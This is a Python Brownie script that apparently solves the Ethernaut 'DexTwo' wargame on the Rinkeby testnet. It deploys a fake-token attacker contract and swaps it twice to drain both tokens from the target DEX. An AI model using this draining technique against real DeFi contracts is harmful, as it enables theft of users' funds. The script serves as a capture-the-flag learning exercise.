from ctypes import addressof
from multiprocessing.connection import wait
from brownie import *
from brownie.network.state import Chain
from web3 import Web3

import time
import json
import os

# for local deployment: 


# get the default priority fee and multiply by 5 to ensure the tx is executed rapidly
priority_fee=chain.priority_fee*5

# DEV deployment
# deployer=accounts[0]
# deployer=accounts[0]
# attacker=accounts[1]
# target_ct=Denial.deploy({'from': deployer, 'priority_fee': priority_fee})

acct_pwd=os.getenv("ACCT_PWD")
attacker=accounts.load('ethernaut_rinkeby', acct_pwd)

target_address='0x57c9AEaeCcD340F38c3F7Ab91f994a181Bd89D4D'
target_ct=interface.DexTwo(target_address)

amount_swap=100

# deploy attacker contract
attacker_contract=dexTwoAttack.deploy(amount_swap, {'from': attacker, 'priority_fee': priority_fee})
# attacker.transfer(target_ct.address, 100000000000, priority_fee=priority_fee)

def main():

    token1=target_ct.token1()
    token2=target_ct.token2()
    print('--- values addresses ---')
    print('target_ct.token1():', token1)
    print('target_ct.token2():', token2)
    print('attacker:', attacker)
    print('attacker_contract:', attacker_contract)

    print('--- values BEFORE attack ---')
    print('target_ct balance token1:', target_ct.balanceOf(token1, target_address))
    print('target_ct balance token2:', target_ct.balanceOf(token2, target_address))
    print('attacker balance token1:', target_ct.balanceOf(token1, attacker))
    print('attacker balance token2:', target_ct.balanceOf(token2, attacker))
    print('target_ct price to buy token 2 for selling 1 token1:', target_ct.getSwapAmount(token1, token2, 1))

    # fake token for the From
    fromToken=attacker_contract.address
    toToken=token2
    i=0

    tx_approve=target_ct.approve(target_address, amount_swap, {'from': attacker, 'priority_fee': priority_fee})
    tx_swap=target_ct.swap(fromToken, toToken, amount_swap, {'from': attacker, 'priority_fee': priority_fee})
    i+=1
    print(f'swap {amount_swap} {fromToken} for {toToken}')

    print(f'--- values after swap {i} ---')
    print('target_ct balance token1:', target_ct.balanceOf(token1, target_address))
    print('target_ct balance token2:', target_ct.balanceOf(token2, target_address))
    print('attacker balance token1:', target_ct.balanceOf(token1, attacker))
    print('attacker balance token2:', target_ct.balanceOf(token2, attacker))

    # drain other token
    toToken=token1
    tx_swap=target_ct.swap(fromToken, toToken, amount_swap, {'from': attacker, 'priority_fee': priority_fee})
    i+=1
    print(f'swap {amount_swap} {fromToken} for {toToken}')

    print(f'--- values after swap {i} ---')
    print('target_ct balance token1:', target_ct.balanceOf(token1, target_address))
    print('target_ct balance token2:', target_ct.balanceOf(token2, target_address))
    print('attacker balance token1:', target_ct.balanceOf(token1, attacker))
    print('attacker balance token2:', target_ct.balanceOf(token2, attacker))


    print('--- It is over ---')
   